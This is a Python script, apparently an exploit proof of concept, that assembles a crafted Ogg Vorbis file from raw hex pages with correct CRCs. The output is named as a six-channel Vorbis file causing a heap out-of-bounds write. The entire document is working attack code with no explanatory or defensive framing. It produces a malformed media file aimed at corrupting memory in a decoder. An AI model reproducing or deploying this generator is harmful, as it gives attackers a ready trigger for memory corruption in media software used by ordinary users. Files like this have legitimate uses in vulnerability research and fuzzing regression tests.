#!/usr/bin/env python3
import struct
import hashlib
from pathlib import Path

def ogg_crc(data: bytes) -> int:
    poly = 0x04C11DB7
    crc = 0
    for b in data:
        crc ^= (b << 24)
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) & 0xFFFFFFFF) ^ poly
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc

def build_page(*, header_type: int, granule: int, serial: int, seq: int, lacing: bytes, payload: bytes) -> bytes:
    header = bytearray()
    header += b'OggS'          # capture
    header += b'\x00'         # version
    header += struct.pack('<B', header_type)
    header += struct.pack('<Q', granule)
    header += struct.pack('<I', serial)
    header += struct.pack('<I', seq)
    header += b'\x00\x00\x00\x00'  # crc placeholder
    header += struct.pack('<B', len(lacing))
    header += lacing
    page = header + payload
    crc = ogg_crc(page)
    page[22:26] = struct.pack('<I', crc)
    return bytes(page)

PAGES = [
    {
        'header_type': 0x02,
        'granule': 0,
        'serial': 0xccd07983,
        'seq': 0,
        'lacing': bytes.fromhex(
            '1e'
        ),
        'payload': bytes.fromhex(
            '01766f72626973000000000680bb000000000000a0f1040000000000b801'
        ),
    },
    {
        'header_type': 0x00,
        'granule': 0,
        'serial': 0xccd07983,
        'seq': 1,
        'lacing': bytes.fromhex(
            '40ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff27'
        ),
        'payload': bytes.fromhex(
            '03766f726269730d0000004c61766635392e32372e313030010000001f000000656e636f6465723d4c61766335392e33'
            '372e313030206c6962766f726269730105766f726269732e424356010008000080224c18c480d090550000100000a0ac'
            '37967bc8bdf7de7b81a847147b88bdf7de7be3ac47d07a88b9f7de7beebda71a7bcbbdf7de7320346415000004008029'
            '089a72e042eabdf71e19e611511a2ac7bdf71e198589309419853d95da5aeb2193dc42ea3de71e080d59050000020040'
            '0821841452482185145248218514524829a598628a29a69862ca29a71c73cc31c720830e3ae8a49350420929a4504a2a'
            'a9a494524a2dd65a73eebd07dd73ef41f820841042082184104208218410420842435601002000000442082164104208'
            '218414524821a69862ca29a780d09055000020008000000000499114cbb11ccdd11ccdf11ccf1125511225d1322dd352'
            '3553333d555445d5545557555d5d776dd5766dd5966dd7566dd5766dd5566d59b66ddbb66ddbb66ddbb66ddbb66ddbb6'
            '6d2034641500200100a0233992232992222992e33892048486ac02006400000400a0288ae3388ee4488e256992667996'
            '67899aa8999ae8a99e0a8486ac0200000100040000000000e0788ae7788e677992e7788e67799aa7699aa6699aa6699a'
            'a6699aa6699aa6699aa6699aa6699aa6699aa6699aa6699aa6699aa6699aa6699aa6694068c82a0040020040c7711cc7'
            '711cc7711c47722407080d590500c800000800405224c7722c477334c7733c477444c7744cc99454c9b55c0b080d5905'
            '0000020008000000000040132c45533cc7933ccf1335cfd334cd134d51344dd3344dd3344dd3344dd3344dd3344dd334'
            '4dd3344dd3344dd3344dd3344dd3344dd3344d531481d090550000040000219d66966a80083390612034641500800000'
            '0018a108430c080d5905000004000088a1e4209ad09af3cd390e9ae5a0a9149bd3c189549b27b9a9989b73ce39e79c6c'
            'ce19e39c73ce29ca99c5a099d09a73ce490c9aa5a099d09a73ce79129b07ada9d29a73ce19e79c0ec619619c73ce69d2'
            '9a07a9d9589b73ce59d09ae6a8b9149b73ce89949b27b5b9549b73ce39e79c73ce39e79c73cea95e9ccec139e19c73ce'
            '89da9b6bb9095d9c73cef9649ceecd09e19c73ce39e79c73ce39e79c73ce0942435601004000000461d818c69d82207d'
            '8e06621421a621931e748f0e93a031c829a41e8d8e464aa98350521927a57482d0905500002000008410524821851452'
            '482185145248218618628821a79c720a2aa8a4928a2aca28b3cc32cb2cb3cc32cbacc3ce3aebb0c310430c31b4d24a2c'
            '35d556638db5e69e73ae39486ba5b5d65a2ba594524a29a52034641500000200402064904106198514524821869872ca'
            '29a7a0820a080d59050000020008000000f024cf111dd1111dd1111dd1111dd1111dcff11c511225511225d1322d5333'
            '3d55545557766d599775dbb7855dd875dfd77ddfd78d5f17866559966559966559966559966559966509424356010020'
            '00000042082184145248218594628c31c79c834e420981d09055000020008000000000477114c7911cc991244bb2244d'
            'd22ccdf2344ff334d1134551344d53155dd11575d3166553365dd33565d35565d57665d9b6655bb77d59b67ddff77ddf'
            'f77ddff77ddff77ddfd7752034641500200100a023399222299222398ee34892048486ac02006400000400a0288ee238'
            '8e23499224599226799667899aa9999ee9a9a20a8486ac0200000100040000000000a0688aa7988aa7888ae7888e2889'
            '9669899aaab9a26ccaaeebbaaeebbaaeebbaaeebbaaeebbaaeebbaaeebbaaeebbaaeebbaaeebbaaeebbaaeebba4068c8'
            '2a004002004047722447722445522445722407080d590500c800000800c0311c435224c7b22c4df3344ff334d1133dd1'
            '333d55744517080d590500000200080000000000c0900c4bb11ccdd12451522dd55235d5522d55543d55555555555555'
            '5555555555555555555555555555555555555555555555555555d5344dd33481d090950000100000823c8458a423d052'
            '92a34f1662127ba790310e7b879431cc722c2163107bd1b1854c6a343266c8592034645500300f0060300c0000000000'
            '00000000000000000000000000000000000000000000000000010000010e0000011642a121ab02801a06008b28c2f320'
            '8a705d00d3041045a82a80690288225415c075015415ae0b00000040d3000000000000000000000000000000a0699024'
            '681a441140d30024099a06a0690092044d031045004d832802000000505588224c13a609609a00a208d304304d005184'
            '6902b82e80aac27501000000000000000000000000000000000000005184a6c1f3609a009e07a0691045005104f03c88'
            '22806902882254150000008024010000000000000000000000000000000000000000000000000000000000009826340d'
            'a208d304104500cf832802882280e741140154154014619a00000000000000000000000000000000000000802842d3e0'
            '793055005104f03c882280e701681a44114055014411a609000000409200000000000000000000000000000000000000'
            '0000000000000000000000004c139a0651846902882280e64114014411c0f3208a00a609208a50550000000000000000'
            '0000000000000000000000c034218a304da82a802802781e4c13c034014411a609a0aa00a208d705000000a069000000'
            '00000000000000000000000000000000000000000000000000000000a609518469c275014c134014619a00a609e07930'
            '4d005505304da82a00000000000000000000000000000000000000000000000000000000000000000000000000000000'
            '000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
            '00000000000000000020000060c0010020c084325068c8aa00601e00c0605992e6f13c4b1435d3e4794491ebf23c47d3'
            '2cd3e4ba9aaa7aaecb75c92e5de7ba348da6d1349ec734691acfa3aa344dd2344f1499a6278aaaaa3245aa4a9699a6a5'
            '699e69725dd1344dd7e5ba5c97ae735da64955a92a5525cb5495aad275a6c9f39826d7a5aa5c97eb725dba4e55691ad3'
            'e4ba4c93eb725db2ccb6b92e0000000400000e3800000e58088586ac0a00e601002c92c4f3781e51649a3c8fe7314d9e'
            '47d3781e4de3793c8fe7f13c9ec7f3681acba269348d69b22c9ac6344912cfa3693c8fe711459ac6f388224d63594493'
            '69324daa4a14992655258a3c8fe7f13ca24814691acf238a348de7d1349ac6f388224da3693c8f65b12ca6c9349926d7'
            '258a4c93eb12459e47d3681acf238a348de711459625000020c0010020c0422834645500300f0060b02c4bd334cfd33c'
            'cf5455d1f33ccf535557f43c49d344553555d55455d7b655d7355d57b66dd77525cbd22ccbd3344fd354d334354df43c'
            '57554d4dd3344d354dd73455d3d46559364d57557559b65555d33455555d557555d5b66dd9755dd7f575dd765da64955'
            'b92e5565db5495ebd275aaaa799eab9aae69baaaaacbb2adaaae69fab66d9ba6a769aeaabaaaeaaaaa6edbb6ebcaaeab'
            'dbb62ecb5495eb725dae4bd7b92e59a6db5c570000508103005081855068c8aa00a08601804108420ba1b5564a8c31a5'
            'd6628cadc552628c31c6184b892da61463ac35b6584a8c2dc6186329adc594628cb5b6165b8b31c618634ca9b598528c'
            'b1d6d662ad31d6186badb5b6166b8db1d6da5aeb9cb5d85a4a31a5946a6b29d5d64aaaadb5565b6b2dc698526d2da5da'
            '5a6bb5b5d66a6badd51853aaada5545b6badc6d85a6dadb51a634ab5b5946a8c29e5185babadb596636cadb696528e31'
            'a516424a31639462e7acd5524aa9b5a6543b67add6da5acd18a51a426bb5d6946ae7acd55a5bab19a3544368add69a52'
            '2da5b55a6b8c3584946a292de55a53aa39b7966bad35d79a52aeb5b55c6b4a35a5527229a5e4524ac92985905b0c21a7'
            '94528e31a55c4a2939a552728c29e59452ca31a6944b2925a7544a8eb1a4dc5a4a39c654724aa5e4d44ac83196926b4d'
            '29c79852aeb5941c6329b9d6526a8ca5e4184bc93196526bed20d71a42ae35a55c6b29b9d65272ad29e55a4bc9b5a694'
            '6b2d25d75a4aaeb5945c6b08b9d69472ad29e55a4bc9b596526b0d21e79c52aeb5b59c7329b9e65272ce21e452620c9e'
            'b3164c88b1a8d45ab1b5b520428c41c6d68ae7ac15535a2bb6b6564c89b1c8186311a1b5624a8cc5d6d68a4a31165b63'
            '2ca6b416546aadd8da5ab135c6626b8cc9e6d68aadad159d5b8b19a354734ea9f69c52cd39a59a734a35e7d46aceadc5'
            '9c53aa39a794736eade6dc5aedbdb59a734a35e79472ceade59c5bab39b756734ea9e69c52aeb9b59c736bb9f7d672ce'
            'add59c5bcb39b716634ca9d69c52adb5b59a732939e7946aceadd55a53aa39a754736e2de79c52cdb9b55a734a35e794'
            '6aceade59c53ca39b756736eade65c4acd39a59c732939e7d672ceb5e69c53ca39a794734ea996524a0ea1a55c4a6b39'
            'a594728cadf5525acb31b69643482997125b8e31a55c4a6b39c6d6720829e5525acb31a694536a2dc718632e25a59c52'
            '6b39d69472ad31f65a9bd2b5a694636d2dd79a528db1945a634a39d6d672adade55a53cab5b696738d31d79a52ae35a5'
            '5c6b8cb9d6d672ad31e65a53cab5a6946b8d31d7da5aaeb5b55c6b6bb9d69472ceade59c63ecb5b696738e31e7dc5ace'
            'b9b55a4a8c4184d682083106955a2bb6b6564c89b1d8d85a11a1b5624a8bc5d6d68208ad05595b0b22b4164c692dd89a'
            '5251a9b5626b8bc594d68a4aad155b532a3ab7566c8db1d8dc5ab0b5b5a0736b3163946ace29d59c53aa39a754734ea9'
            'e69c52cdb9b59a734a35e79472ceadd59c53aa39b756734e29e79c52ceb9b59a736b35f7d66ace29d59c53ca39b79673'
            '6e2df7de5aceb9b59c736b39e7d6628cadd55a53aab5b6566b2d25e79c52cdb9b55a6b4a35e7946aadade55c53aa39b7'
            '566b4da9e69c52ad35a55c6b2935e7d66aadadd59c4ba939a794732e25e7dc5aae35c69c7329b9d69472cea5d4524aa9'
            '21b4964b69ada694528eb5b55c4a8c39c6d67208ade55262ccb1a6944b692dc7d85a0e21a55c4a6b39c694724aade518'
            '63cca5a494536a2dd79a52ae35c65c6b53bad69472adade55a53aa31a694634c29d7d85aae35b55c6b4ab9d6d66aad31'
            'e65a53cab5a6946b8d31d7da5aae35c65a6b4ab9d69472ad31e65a5bcbb5b6966b6d2dd79a52adb5b59c738cbdd6d672'
            'ce31e65a5bcb39b796538ab198d25a50a9b5e25a4ac5d6d68a2931165b5b2ba6b456546aadd8da5a51a9c5626b6bc594'
            'd68a4aad155b532a2ab5566c6d2d989252702da5606b4a45e7d68aad31169d532abab656744ea9768e52cdb9949a734a'
            '35e79472ceade59c53ca39b756732e25e79c52ceb9b59c734a39e7186bcea5e49c53ca39b796736e2df7de5aae35a59c'
            '734a39e7d67ace31e6de63ec39b796736e2de7dc5a8d31a55a6b4ab5d6d672ad29e55c53cab5b6966b6dade69c52aeb5'
            'b55c6b4ab9e6d672adadd59c53cab5a6946b4d29e7da5aaeb5b59c7349b9d69472cea5e49c5bebb5c698734e29d79a52'
            'ce39a59a5208b594d6724aade5d65acbb5c698536a2dd71a632da5b59c528cb9d6d67229add55a63aca5a494536a2dd7'
            'da5a6e2dc65c6bad39a594724bade55a53ca39c79a6b6d4ad7da5aae35c65c6b6b35c6526a8c29d51853cab5b6966b6d'
            '2dd7da52ad35c65c6b4ab9d69472adb5e65a53cbb5c6586b4d29d79a52aeb5d65c6b6bb9d61873ad29d55a5bcbb5c698'
            '738e31d71a63ce39c65c6b8c39e71873ad31169d5b2b3ab7567c4fa908e15ad139c622846b45e7d68aeead15215c2b3a'
            'c7167c702de89c5ad1b9b522844ac5f7d68af0ad159d532a3ab7568450a908e15af13dc622844ac1f7948a102ae59c53'
            'ea39a7d4734ea9e7dc5ad0b9d69e734a41e75a7bce29f59c5b2b3ac7d8734e29e85c6bcf39a59e736b41e7187bcead05'
            '9f6bed39a7d4736eade81c63d0b9d6e07bcec5e6188bceb5169d63cc31b6966b6dadd7da5aafb5b560736bbdd6d682ad'
            '31f69c5bebb5b6166c6dadd7da5ab035c69c734abdd6d682adadf59c5b0bb6c6d6734ea9d7da5ad039a5a0738cc1d618'
            '8bcead055b5b0b3ab756730ea1e6dc5aee39c69c73ad39e7a874ce31e69c93d239b7967baf35e79c94ee39c6dc7b723a'
            'e71673efb5e69c9bd239d79a7b4f4ae75c63ceb9d69c7352baf7a674f0d1e99c9bd2bd37a7734ecec6584aad35a55a6b'
            '6bb9d61873aecde95a5babb526a56b4d29d7da5aaeb5295d6b6bb5d6e66cad29e55a5bcbb536a96b8d31d7da9caeb5b5'
            '5c6b8c35e7e674ce4de95a9bd23937a76b8d4ee7dc9c010000030e0000012694814243560500350c0006cdd275cdf374'
            'ddf33c5d27cbbecfb67d5f1345df375555184ecfd37db66d1c6ddbf74551f47d575585e114455d67dbcad2b67d9fae1b'
            '439ca72cfb3e61b89eba2e0c75dd385ad3339565df671cadba2e0c97a6c9b2689abaae9aa6ae93aee388719ca6a9ebae'
            '2c0bc3abaabaceba8e23e9385e55d575ddb68d6356555d473a96d2752cadc61248d371b492a21c3196c0798e21ab1465'
            'b92c4b963dcb525551d3649969aa2ad7b56dd1f36cdb354d5936354d96a9aaae535559163dcfb665d3946d55d36499aa'
            'ea3a559565aeabeba469189aa62cb36de7e9bab2cc75759d740d47d39465beef4c5d5796a9aa2c735ddfe7babecff749'
            '8523aeabeb74dd38baaeeff37de92a0cd7d4757d9fae2b4bd7f57dbe6f5d85df4a3802745d7a2a4fab71c418027cdf9a'
            '3a4fabb344555d9769aa2a55755dae6b9a64d975a9aa2c9365d7659aae4b966d99ebba2ed79565b62dcb4cd375c9b26d'
            '935dd765dbb64d9a7e9febba2edf77a6b2acaa6cdbb639cfaf735dd7250ccf53965555f33cdf574d53d75dd31486b6ed'
            'eb745d185651f47ddb75856116455f67dbcad1b67ddf354de1f86559386ed3f47db6ad2c6d5d18eabab1c479cab23014'
            '8e565df785ba6e1c71a6b62d0c9523be2f0c9fa6d9b6abaaba2eabaaaec3584acf71bca6aafbb62c1bc7adaabace7996'
            'a3d3386655f57d61d795e5765d5d27359ed6752cad6b5902e95a8e90a22c59cf13588d23ac28cf6a9ab66dabaa2cdbaa'
            'aaeb6cd975e9baefcbaaaaebbe2cebba6e9ab6ceb67d9f6debbaacaaba6edcb6aeeba6a9db6cdbf7d9b6aed375e1275d'
            'c751966d9b313c535db76dbaef0b518eb2acdb9425ba6edb5cd796c9b2ef735ddfe7fb56c2d12acbbe4fd78da3ebfa3e'
            'dfb7aec210591686beaf3c5d57180ac395305c53e308f07d69aa2c318e56e36805be6fe53c518eb8aeae735ddd26cbba'
            'ceb66d9baefb3e59d67dbaeefb5c57d7d9b6efb36d5d27cbba4fd77d9febea3a5d1786b6adeb745d184ad3b29465db26'
            '0c57b6adeb745d185a8da72ceb3ae368d5755bf73c4ff85dd3f47dd934859fae0b435d178657558d63775de3d84dd317'
            'dab671b46d61984dd3f785db1686dd347d9dae2b4fdbd67dbeaf2c91aeb22c0c8da154d785a1ae1b4b56a92cfb426569'
            'f575df173dcfb65d55d5755955759df42c4794e355555fd76559386e55d575d6b51cade9386e55d575e1b68d63775d5d'
            '675dcf92741c59cf1338d371449ae22cad695902d67064b55a95a5aaea3a55b56daeabeb74ddb6f9beef735ddf67dbbe'
            '4f55759dae0b435dd775aeebfb6c5bd7a9aaaed37561a8ebb6cef78521cad2b6759d714ce9baadf37d61285596b6adeb'
            '9ce7cad76d9bebca32d7f57daeebfb7cdf9a1ac3942cfb3e5d3796aeebfb7ce14a185a6559f8e9bab2745ddfe7fbd253'
            'f8ad8ce39a02dd97a6ca126388714c01dfb7aece1463699565dfe7baba4e967d9f6deb3a5d1786b22cfc745d18baaeef'
            'd3756168dbbe4f967da1ae0b43d7f57db62d0c6ddbf7f9be30944a4b59f67dc2105df77dbe6e1cadce5396759d7144d7'
            '759deb0a43db1686b62d0c85e1180ac372946561e8fbc651967d9f302c4bdf1786b26c1c85e138cab230148665e90bc3'
            '501896a5545adab6ef739652dff77dc2b12c21d5755f283d118e5f288ab6cdb6759f6deb3a8ca3d458baaeaef37d6168'
            'dbb6cdaa1cadc2d1b67d9d712c475bd775a4e7897194a66509a4e9385a9da755595a9527200d47ac2bcad1787e9ff40c'
            '43d271b4a6e3c85a96ce330c318eca330cadcad49a8ea3b30c4794a5f30c43eb9aa64ee3685dc711e7ea3cbf0f29e9f9'
            '8556e589f454a66108a46918baae2cb36ddf67dbbecf38a21c57b2ecfb7cdf38cab2ef138e29e3989265df270ccb5396'
            '7da1714c19c794b19402df979ece1363897104f83ea9754559e2fbca53f8ada9304c4fe5685596ebeaebd655594a75dd'
            '791a4ba9715c57df979ece325d7ddd792a4bab714c29c77405beaf4c9dabd5389ea972b462e5fbce539a621c53ae2b0c'
            '755b18dab6711486e1681cc751968da32f2c4759f685c2702c856118cab230148ee328cbbecf3896a72f0c3fe1588e58'
            '535df77dce335d85e1f7f9c271449aeabaef939e08c3ef334ddb66dbbaceb6759dd538a22c6559f709bf71b46d5d274d'
            'cbd19a8ea16deb3ae3588eba6edbac69595ad370445902e71a86aceb897294aee508ac6b38225d518ece330ca569384a'
            'd771941a47abb254a6e3c83a8ed6340cadce13e3684dc751aa2c9d6918b2aea7740d43d272449a4acf2f04526128559e'
            '3857e71986409a86a1ebca32dbf67db6edfb8c634a59ae64d9f7f9be719465df671cd3d5385a65d9f709c3739465dfa7'
            '1cadc6714d8d25c0f7a5a934c558a22c53c0f7499d27ce13df979ec6305d85a3d458aeabb2b4fac2747596f8be335596'
            '284bab304c53e589ef732a4fa971b42acf758555184aa529c6b24d9d2540183a81b26cd70000e0030700e00213ca40a1'
            '21ab0080030080210e00001c70000008303131858586ac0a00e6010000c69873cc390621a5143ae720b4d442e7146392'
            '522925a5546b6da9a59472aeb1b54829879063cc3166a5944c41e7ac945229e69c95d24a49a5f45a6329ad945c6b2d25'
            '630c538a29b5947aadb5b59652d1b9b65642a929c5945a4ac1d69a524ca9e75c53ca9cc3945a29ad945e632ca595126c'
            'ada5748c594a31a59652cfb5b6d652ea39d7d6522935a598524c29d85a538a29159b732a050040253800402558088586'
            'ac0a00e6010008a514638c31e61c841032e69c831042e71463ce39e71c740e3a089d93ce4908a5734a29a79463cc3126'
            '9d838c41c6a4739031c698748e422821a41052e728841642eb1c634c422821941052292584144a2aa984103a27219410'
            '5208a99414420a21959242e89ca310520829841642eb1c85d042689d738c4908258412424a2985904a4929a5104a0829'
            '84144a2a2595924248a5a4525208050000173800001758088586ac0a00e60100820000000000000007f20060ea0a0760'
            'ea0a0ba1d0905501c03c0000002183d039082184103a0819841042082183104208218410420821841042082184504108'
            '218410420821841042082184104288a083104208218410420821841042082174d0410821841042082184104208218410'
            '42082184104208218410420821841042089184524a29a594524a29a594524a29a5944e4a29a594524a29a594524a29a5'
            '94524a29a594524a29a594524a29a594524a29a500409c0907409c090ba1d0905500400600004004328c3907a194945a'
            '8bb1d69c732e008025c2010032c1085b4db9f4103cd1c832091d55d87001161ab20a00c80000388e0c00003c70000008'
            '30c256532e3d044f34b24c424715365c808586ac0400080000002208101ab21200480500008c710e3a08a594d228e418'
            '84104a28a5418a39082184124a071d741252682595ce4107a184545269a19454526aa9b5d6422929a5945a6bad95945a'
            '6badb5d65a2b29b5d65a6badb5965a6badb5d65a6c2db5d45a6badb5d65a6badb5165b6badb5145b6bb1b5d65a6b0500'
            '802738000015d8b03ac249d15860a1212b01800c0000c418848c4108196410424821851452480000c080030040800965'
            'a0d090950040020040100018008833e10088336121141ab21200000200401086d07a7184594c72331942ca49ec102288'
            '490a9942884148a5634a39c7b9949039084ab6d2410800000021008040c804020550602003000e1012a40080c2024387'
            '08112046818171716903001084c80c9188580c1213aa81a2623a00585c60c807800c8d8db48b0be832c0055ddc752084'
            '20042188c50114908083136e78e20d4fb8c1093a45a50e0000912000000000e01f00e00000706c00c9ccdc078e0e8f0f'
            '90109111929211931394140100000000e907800e0080c3054866e63e7074787c8084888c90948c989ca0a40400000000'
            '300000140000042a732b2c2d28290100c038008d080600000400000080800000c038008d080600000440400080804000'
            '00000000200000004040'
        ),
    },
    {
        'header_type': 0x04,
        'granule': 4800,
        'serial': 0xccd07983,
        'seq': 2,
        'lacing': bytes.fromhex(
            '01020202020202'
        ),
        'payload': bytes.fromhex(
            '000a000e000e000e000e000e00'
        ),
    },
]


def main(out_path: str = 'poc_vorbis_6ch_heap_oobwrite.ogg') -> None:
    out = bytearray()
    for p in PAGES:
        out += build_page(**p)
    Path(out_path).write_bytes(out)
    h = hashlib.sha256(out).hexdigest()
    print(f'[+] wrote {out_path} ({len(out)} bytes) sha256={h}')

if __name__ == '__main__':
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else 'poc_vorbis_6ch_heap_oobwrite.ogg'
    main(out)
